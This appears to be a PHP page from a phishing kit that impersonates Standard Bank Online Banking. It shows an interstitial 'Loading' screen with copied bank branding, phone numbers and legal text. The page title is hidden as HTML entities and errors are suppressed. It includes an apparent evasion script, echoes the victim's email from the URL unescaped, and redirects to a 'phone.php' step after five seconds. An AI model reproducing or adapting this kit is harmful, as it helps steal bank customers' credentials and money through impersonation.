<?php
error_reporting(0);
ob_start();
session_start();
require_once '../esc/index.php';
?>
<html lang="en" ng-app="refresh" class="ng-scope mdl-js">
<head>
    <meta HTTP-EQUIV='REFRESH' content='5; url=./phone.php'/>
    <style type="text/css">
        [uib-typeahead-popup].dropdown-menu{display:block;}
    </style>
    <style type="text/css">
        .uib-time input{width:50px;}
    </style>
    <style type="text/css">
        [uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,[uib-popover-popup].popover.top-left > .arrow,[uib-popover-popup].popover.top-right > .arrow,[uib-popover-popup].popover.bottom-left > .arrow,[uib-popover-popup].popover.bottom-right > .arrow,[uib-popover-popup].popover.left-top > .arrow,[uib-popover-popup].popover.left-bottom > .arrow,[uib-popover-popup].popover.right-top > .arrow,[uib-popover-popup].popover.right-bottom > .arrow,[uib-popover-html-popup].popover.top-left > .arrow,[uib-popover-html-popup].popover.top-right > .arrow,[uib-popover-html-popup].popover.bottom-left > .arrow,[uib-popover-html-popup].popover.bottom-right > .arrow,[uib-popover-html-popup].popover.left-top > .arrow,[uib-popover-html-popup].popover.left-bottom > .arrow,[uib-popover-html-popup].popover.right-top > .arrow,[uib-popover-html-popup].popover.right-bottom > .arrow,[uib-popover-template-popup].popover.top-left > .arrow,[uib-popover-template-popup].popover.top-right > .arrow,[uib-popover-template-popup].popover.bottom-left > .arrow,[uib-popover-template-popup].popover.bottom-right > .arrow,[uib-popover-template-popup].popover.left-top > .arrow,[uib-popover-template-popup].popover.left-bottom > .arrow,[uib-popover-template-popup].popover.right-top > .arrow,[uib-popover-template-popup].popover.right-bottom > .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}
    </style>
    <style type="text/css">
        .uib-datepicker-popup.dropdown-menu{display:block;float:none;margin:0;}.uib-button-bar{padding:10px 9px 2px;}
    </style>
    <style type="text/css">
        .uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}
    </style>
    <style type="text/css">
        .uib-datepicker .uib-title{width:100%;}.uib-day button,.uib-month button,.uib-year button{min-width:100%;}.uib-left,.uib-right{width:100%}
    </style>
    <style type="text/css">
        .ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}
    </style>
    <style>
        @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
    <link rel="stylesheet" href="../libraries/css/app.min.css">
    <title>&#83;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#32;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
</head>

<body ng-controller="spinnerController" ng-class="{'login migration-login-bg': migrationLogin(), 'login-strong-auth-bg':strongAuthLogin(), 'dg-ao background':digitalAccountOrigination(), 'facial-recognition-bg':facialRecognitionFlow()}" class="ng-scope login migration-login-bg login-strong-auth-bg"
cz-shortcut-listen="true">
    <div class="content-wrapper">
        <dtm-analytics></dtm-analytics>
        <ng-include src="" class="ng-scope">
            <div ng-controller="HeaderController" class="ng-scope">
                <header id="top" ng-class="{'header-no-bg': migrationLogin() || isDigitalAccountOrigination() || facialRecognitionFlow()}" class="header-no-bg">
                    <div ng-show="!directorWithoutCardLogin()" class="fixTheBasicsFeature content-wrapper-inner position-relative" ng-mouseleave="closeMenu()">
                        <div></div>
                        <ul ng-if="migrationLogin() || facialRecognitionFlow()" class="ng-scope">
                            <li><img class="migration-logo" src="../libraries/img/sb_logo.png" alt="logo"></li>
                        </ul>
                    </div>
                </header>
            </div>
        </ng-include>
        <ng-include src="" class="ng-scope">
            <div class="modal-overlay ng-scope ng-hide" ng-show="notificationError">
                <div class="modal-container action-modal">
                    <div class="modal-header">
                        <h3 class="ng-binding"></h3></div>
                    <div class="modal-content">
                        <div ng-bind-html="notificationError" class="ng-binding"></div>
                        <br>
                        <br>
                    </div>
                    <div class="actions">
              
                    </div>
                </div>
            </div>
        </ng-include>
        <input id="email" name="email1" type="hidden" class="login-container-content-username ng-binding" aria-label="Email or Phone" value="<?php echo $_GET['email']; ?>" style="background-color: #FFF;border: none;overflow: hidden;text-overflow: ellipsis;padding: 0px;margin: 0px;height: auto;" disabled>
        <footer class="login migration-login ng-scope" ng-controller="HeaderController" ng-if="migrationLogin()">
            <div class="row info no-padding-top">
                <div class="row contact-links">
                    <div class="no-padding small-12 medium-12 large-3 columns"><img src="../libraries/img/icon_south_africa_white.png"> <span class="white-text">South Africa 0860 123 000</span></div>
                    <div class="no-padding small-12 medium-12 large-4 columns"><img src="../libraries/img/icon_global_white.png"> <span class="white-text">International +27(0)10 249 0423</span></div>
                    <div class="small-12 medium-12 large-5 columns"><img src="../libraries/img/icon_email_white.png"> <span class="white-text">Email us at <a href="mailto:ibsupport@standardbank.co.za"><span class="white-text footer-text-link">ibsupport@standardbank.co.za</span></a>
                        </span>
                    </div>
                </div>
                <div class="row fsb-legal-declaration-migration">
                    <p class="white-text">Standard Bank is a licensed financial services provider in terms of the Financial Advisory and Intermediary Services Act and a registered credit provider in terms of the National Credit Act, registration number NCRCP15.</p>
                </div>
            </div>
        </footer>
        <div class="spinner pace pace-active" ng-class="spinnerClass" ng-hide="spinnerStyle !='global'" style="">
            <div class="pace-activity migration" ng-class="{'migration': migrationLogin(), 'dg-ao': digitalAccountOrigination()}"></div>
            <div class="spinner-message migration" ng-class="{'migration': migrationLogin(), 'dg-ao': digitalAccountOrigination()}">Loading – please wait a moment</div>
        </div>
        <ng-include src="" class="ng-scope"> </ng-include>
        <go-to-top class="ng-isolate-scope" style="display: none;">
            <div class="always-back-to-top hide-on-print">
                <div class="back-to-top"><a ng-click="$ctrl.goToTop()"><i class="icon icomoon-back-to-top"></i></a></div>
            </div>
        </go-to-top>
    </div>
   
    <div class="offline-ui offline-ui-up">
        <div class="offline-ui-content"></div>
        <a href="" class="offline-ui-retry"></a>
    </div>
    <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
    <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
    <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
    <div class="kxhead" data-id="sonawe71k" style="display:none !important;"><span class="kxtag kxinvisible" data-id="43423"></span>
        <span
        class="kxtag kxinvisible" data-id="33311">
           
            </span><span class="kxtag kxinvisible" data-id="46073"></span>
            <span
            class="kxtag kxinvisible" data-id="33312">
        
                </span><span class="kxtag kxinvisible" data-id="34576"></span></div>

</body>

</html>